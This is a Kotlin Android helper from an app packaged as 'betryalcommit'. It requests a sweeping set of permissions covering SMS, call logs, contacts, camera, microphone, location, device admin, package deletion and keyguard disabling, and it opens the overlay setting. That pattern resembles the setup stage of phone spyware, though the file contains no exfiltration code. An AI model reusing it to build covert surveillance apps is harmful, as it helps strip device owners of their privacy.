package com.example.betryalcommit

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.ActivityCompat.startActivityForResult
import androidx.core.content.ContextCompat


object Permsu{
    private val permissions = arrayOf(
    Manifest.permission.INTERNET,
    Manifest.permission.ACCESS_WIFI_STATE,
    Manifest.permission.ACCESS_NETWORK_STATE,
    Manifest.permission.ACCESS_COARSE_LOCATION,
    Manifest.permission.ACCESS_FINE_LOCATION,
    Manifest.permission.FOREGROUND_SERVICE,
    Manifest.permission.REQUEST_DELETE_PACKAGES,
    Manifest.permission.USE_FULL_SCREEN_INTENT,
    Manifest.permission.BIND_DEVICE_ADMIN,
    Manifest.permission.DELETE_PACKAGES,
    Manifest.permission.KILL_BACKGROUND_PROCESSES,
    Manifest.permission.CAMERA,
    Manifest.permission.READ_CONTACTS,
    Manifest.permission.GET_ACCOUNTS,
    Manifest.permission.RECORD_AUDIO,
    Manifest.permission.MODIFY_AUDIO_SETTINGS,
    Manifest.permission.READ_PHONE_STATE,
    Manifest.permission.READ_CALL_LOG,
    Manifest.permission.PROCESS_OUTGOING_CALLS,
    Manifest.permission.MANAGE_DEVICE_POLICY_LOCK,
    Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
    Manifest.permission.READ_PHONE_NUMBERS,
    Manifest.permission.READ_SMS,
    Manifest.permission.RECEIVE_SMS,
    Manifest.permission.SEND_SMS,
    Manifest.permission.WRITE_EXTERNAL_STORAGE,
    Manifest.permission.READ_EXTERNAL_STORAGE,
    Manifest.permission.VIBRATE,
    Manifest.permission.DISABLE_KEYGUARD,
    Manifest.permission.WAKE_LOCK)
    val permissionsToRequest = mutableListOf<String>()
    fun requestPermissions(context: Context, activity: AppCompatActivity, requestCode: Int) {

        for (permission in permissions) {
            if (ContextCompat.checkSelfPermission(
                    activity,
                    permission
                ) != PackageManager.PERMISSION_GRANTED
            ) {
                permissionsToRequest.add(permission)
            } }
        if (!Settings.canDrawOverlays(context)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + context.getPackageName())
            )
            activity.startActivityForResult(intent, 0)
        }

        if (permissionsToRequest.isNotEmpty()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ActivityCompat.requestPermissions(
                    activity,
                    permissionsToRequest.toTypedArray(),
                    requestCode);
            }
        }
        Toast.makeText(context, "go ahead", Toast.LENGTH_LONG).show()
        }

}
